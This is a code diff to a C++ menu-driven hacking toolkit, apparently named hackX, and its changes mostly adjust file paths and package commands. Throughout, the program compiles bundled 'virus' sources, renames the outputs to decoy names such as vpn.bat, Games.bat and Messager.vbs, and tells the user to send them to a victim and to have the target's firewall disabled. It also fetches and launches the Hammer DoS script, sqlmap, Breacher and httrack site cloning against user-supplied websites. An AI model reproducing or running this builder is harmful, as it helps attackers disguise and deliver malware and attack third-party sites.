@@ -26,7 +26,7 @@ void InstallSystem(string Application)
 	system (Commandstr.c_str());
 	
 	string Commandstrs;
-	Commandstrs +="pacman -U "+Application;
+	Commandstrs +="pacman -S "+Application;
 	system (Commandstrs.c_str());
 	
 	string Commanded;
@@ -44,7 +44,7 @@ void UpgradeSystem()
 	system("sudo apt-get upgrade");
 	system("apt-get upgrade");
 	system("pkg upgrade");
-	system("pacman -U");
+	system("pacman -Syyu");
 	system("yum upgrade");
 	system("pkgin upgrade");
 	system("brew upgrade");
@@ -56,7 +56,7 @@ void UpdateSystem()
 	system("sudo apt-get update");
 	system("apt-get update");
 	system("pkg update");
-	system("pacman -U");
+	system("pacman -Sy");
 	system("yum update");
 	system("pkgin update");
 	system("brew update");
@@ -99,9 +99,9 @@ int main()
  		#ifndef __linux__
  		system ("git clone git://github.com/cyweb/hammer.git");
  		#endif
-		system ("mv ~/hackX/hammer/hammer.py ~/hackX/");
-		system ("mv ~/hackX/hammer/headers.txt ~/hackX/");
-		system ("mv ~/hackX/hammer/README.md ~/hackX/");
+		system ("mv hammer/hammer.py ../hackX");
+		system ("mv hammer/headers.txt ../hackX");
+		system ("mv hammer/README.md ../hackX");
 		
 		system("clear");
 		
@@ -156,18 +156,17 @@ int main()
 			
 			if (1 == vus)
 			{
-				system ("cp ~/hackX/Data/virusWindows.cpp ~/hackX/");
-				system ("g++ virusWindows.cpp");	
+				system ("cp Data/virusWindows.cpp ../hackX");
+				system ("c++ virusWindows.cpp");	
 				system ("./a.out");
 				
 				system ("mkdir Output");
 
-				system ("mv ~/hackX/hi.txt ~/hackX/Output/vpn.bat");
+				system ("mv hi.txt Output/vpn.bat");
 				system ("rm -rf virusWindows.cpp");
 			
-				system ("g++ hackx.cpp");
-				system ("clang++ hackx.cpp");
-				system ("mv ~/hackX/a.out ~/hackX/hackx.run");
+				system ("c++ hackx.cpp");
+				system ("mv a.out hackx.run");
 				cout << "  \033[1;32mCreated virus for Windows\033[1;m";
 				printf (" \033[1;36mHelp: File Name is vpn.bat and Must you send virus a device \033[1;m");
 				printf (" \033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m");
@@ -178,14 +177,14 @@ int main()
 			
 			else if (2 == vus)
 			{
-				system ("cp ~/hackX/Data/virusHard.cpp ~/hackX/");
-				system ("g++ virusHard.cpp");
+				system ("cp Data/virusHard.cpp ../hackX");
+				system ("c++ virusHard.cpp");
 				system ("./a.out");
 				system ("mkdir Output"); 
-				system ("mv ~/hackX/hi.txt ~/hackX/Output/Games.bat");
+				system ("mv hi.txt Output/Games.bat");
 				system ("rm -rf virusHard.cpp");
-				system ("g++ hackx.cpp");
-				system ("mv ~/hackX/a.out ~/hackX/hackx.run");
+				system ("c++ hackx.cpp");
+				system ("mv a.out hackx.run");
 				cout << "  \033[1;32mCreated virus for Windows\033[1;m";
 				printf (" \033[1;36mHelp: File Name Games.bat and Must you send virus a device\033[1;m");
 				printf (" \033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m");
@@ -195,11 +194,11 @@ int main()
 			}
 			else if (3 == vus)
 			{
-				system ("cp ~/hackX/Data/virusCD.vbs ~/hackX/");
+				system ("cp Data/virusCD.vbs ../hackX");
 				system ("mkdir Output");
-				system ("mv ~/hackX/virusCD.vbs ~/hackX/Output/debugCD.vbs");
-				system ("g++ hackx.cpp");
-				system ("mv ~/hackX/a.out ~/hackX/hackx.run");
+				system ("mv virusCD.vbs Output/debugCD.vbs");
+				system ("c++ hackx.cpp");
+				system ("mv a.out hackx.run");
 				cout << "  \033[1;32mCreated virus for CD Rom\033[1;m";
 				printf (" \033[1;36mHelp: File Name debugCD.vbs and Must you send virus a device\033[1;m");
 				printf (" \033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m");
@@ -209,12 +208,11 @@ int main()
 			}
 			else if (4 == vus)
 			{
-				system ("cp ~/hackX/Data/virusError.vbs ~/hackX/");
+				system ("cp Data/virusError.vbs ../hackX");
 				system ("mkdir Output");
-				system ("mv ~/hackX/virusError.vbs ~/hackX/Output/Messager.vbs");
-				system ("g++ hackx.cpp");
-				system ("clang++ hackx.cpp");
-				system ("mv ~/hackX/a.out ~/hackX/hackx.run");
+				system ("mv virusError.vbs Output/Messager.vbs");
+				system ("c++ hackx.cpp");
+				system ("mv a.out hackx.run");
 				cout << "  \033[1;32mCreated virus for Messager\033[1;m";
 				printf (" \033[1;36mHelp: File Name Messager.vbs and Must you send virus a device\033[1;m");
 				printf (" \033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m");
@@ -224,12 +222,11 @@ int main()
 			}
 			else if (5 == vus)
 			{
-				system ("cp ~/hackX/Data/virusVoice.vbs ~/hackX/");
+				system ("cp Data/virusVoice.vbs ../hackX/");
 				system ("mkdir Output");
-				system ("mv ~/hackX/virusVoice.vbs ~/hackX/Output/Voice.vbs");
-				system ("g++ hackx.cpp");
-				system ("clang++ hackx.cpp");
-				system ("mv ~/hackX/a.out ~/hackX/hackx.run");
+				system ("mv virusVoice.vbs Output/Voice.vbs");
+				system ("c++ hackx.cpp");
+				system ("mv a.out hackx.run");
 				cout << "  \033[1;32mCreated virus for Voice\033[1;m";
 				printf (" \033[1;36mHelp: File Name Messager.vbs and Must you send virus a device\033[1;m");
 				printf (" \033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m");
@@ -243,15 +240,15 @@ int main()
 			InstallSystem("git");
 			InstallSystem("clang++");
 			InstallSystem("clang");
+			InstallSystem("g++");
 			int vus;
-			system ("cp ~/hackX/Data/virusLinux.cpp ~/hackX/");
-			system ("g++ virusLinux.cpp");
+			system ("cp Data/virusLinux.cpp ../hackX");
+			system ("c++ virusLinux.cpp");
 			system ("mkdir Output");
-			system ("mv ~/hackX/a.out ~/hackX/Output/vpn.run");
+			system ("mv a.out Output/vpn.run");
 			system ("rm -rf virusLinux.cpp");
-			system ("g++ hackx.cpp");
-			system ("clang++ hackx.cpp");
-			system ("mv ~/hackX/a.out ~/hackX/hackx.run");
+			system ("c++ hackx.cpp");
+			system ("mv a.out hackx.run");
 			cout << "  \033[1;32mcreated virus for Linux\033[1;m";
 			printf (" \033[1;36mhelp: File Name is vpn.run and Must you send virus a device\033[1;m");
 			printf (" \033[1;31mAttention: must be device Linux\033[1;m");
@@ -269,11 +266,12 @@ int main()
 	else if ( 3 == n)
 	{
 		InstallSystem("git");
+		InstallSystem("python");
 		system ("git clone https://github.com/stamparm/fetch-some-proxies");
 		#ifndef __linux__
 		system ("git clone git://github.com/stamparm/fetch-some-proxies.git");
 		#endif
-		system ("mv ~/hackX/fetch-some-proxies/fetch.py ~/hackX/");
+		system ("mv fetch-some-proxies/fetch.py ../hackX/");
 		system ("clear");
 		system ("python2 fetch.py --threads=300");
 		system ("rm -rf fetch-some-proxies");
@@ -318,9 +316,9 @@ int main()
 		#ifndef __linux__
 		system ("git clone git://github.com/s0md3v/Breacher.git");
 		#endif
-		system ("mv ~/hackX/Breacher/breacher.py ~/hackX/");
-		system ("mv ~/hackX/Breacher/paths.txt ~/hackX/");
-		system ("mv ~/hackX/Breacher/LICENSE ~/hackX/");
+		system ("mv Breacher/breacher.py ../hackX");
+		system ("mv Breacher/paths.txt ../hackX");
+		system ("mv Breacher/LICENSE ../hackX");
 		system ("clear");
 		cout <<  "Website Address:";
 		cin >> s2;	
@@ -367,19 +365,19 @@ int main()
 		#ifndef __linux__
 		system ("git clone --depth 1 git://github.com/sqlmapproject/sqlmap.git sqlmap-dev");
 		#endif
-		system ("mv ~/hackX/sqlmap-dev/COMMITMENT ~/hackX/");
-		system ("mv ~/hackX/sqlmap-dev/doc ~/hackX/");
-		system ("mv ~/hackX/sqlmap-dev/lib ~/hackX/");
-		system ("mv ~/hackX/sqlmap-dev/plugins ~/hackX/");
-		system ("mv ~/hackX/sqlmap-dev/sqlmapapi.py ~/hackX/");
-		system ("mv ~/hackX/sqlmap-dev/sqlmap.py ~/hackX/");
-		system ("mv ~/hackX/sqlmap-dev/thirdparty ~/hackX/");
-		system ("mv ~/hackX/sqlmap-dev/data ~/hackX/");
-		system ("mv ~/hackX/sqlmap-dev/extra ~/hackX/");
-		system ("mv ~/hackX/sqlmap-dev/LICENSE ~/hackX/");
-		system ("mv ~/hackX/sqlmap-dev/README.md ~/hackX/");
-		system ("mv ~/hackX/sqlmap-dev/sqlmap.conf ~/hackX/");
-		system ("mv ~/hackX/sqlmap-dev/tamper ~/hackX/");
+		system ("mv sqlmap-dev/COMMITMENT ../hackX");
+		system ("mv sqlmap-dev/doc ../hackX");
+		system ("mv sqlmap-dev/lib ../hackX");
+		system ("mv sqlmap-dev/plugins ../hackX/");
+		system ("mv sqlmap-dev/sqlmapapi.py ../hackX/");
+		system ("mv sqlmap-dev/sqlmap.py ../hackX/");
+		system ("mv sqlmap-dev/thirdparty ../hackX/");
+		system ("mv sqlmap-dev/data ../hackX/");
+		system ("mv sqlmap-dev/extra ../hackX/");
+		system ("mv sqlmap-dev/LICENSE ../hackX/");
+		system ("mv sqlmap-dev/README.md ../hackX/");
+		system ("mv sqlmap-dev/sqlmap.conf ../hackX/");
+		system ("mv sqlmap-dev/tamper ../hackX/");
 		system ("clear");
 		cout <<  "Please Enter the Website That Has the Bug(Without http://):";
 		cin >> s4;	
@@ -415,7 +413,7 @@ int main()
 		cout <<  "please Enter Website for Receive Template:";
 		cin >> s5;
 		
-		str5="httrack "+s5+" +* -r6 -O ~/hackX/templateWeb";
+		str5="httrack "+s5+" +* -r6 -O templateWeb";
 
 		const char * commands = str5.c_str();
 		system (commands);
